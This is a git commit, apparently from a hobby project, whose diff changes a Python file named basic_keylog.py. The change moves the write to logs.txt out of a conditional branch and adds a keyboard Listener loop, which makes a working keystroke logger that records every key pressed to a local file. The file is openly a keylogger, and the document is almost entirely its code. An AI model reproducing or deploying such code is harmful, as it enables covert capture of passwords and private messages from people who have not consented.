1dd4c477df88e51f6b0c6bf8cac149c6d42b63e5
Bearhost <adedoyin.adetunji@miva.edu.ng>
2024-11-29 12:47:09 +0100

    called the listener method

--- basic_keylog.py
+++ basic_keylog.py
@@ -6,5 +6,9 @@ def log_keys(key):
         key= ' '
     elif'key'in key:
         key = f"[{key}]"
-        with open("logs.txt", "a") as log_file:
-            log_file.write(key)
+        
+    with open("logs.txt", "a") as log_file:
+        log_file.write(key)
+        
+with Listener(on_press=log_keys) as listener:
+    listener.join()
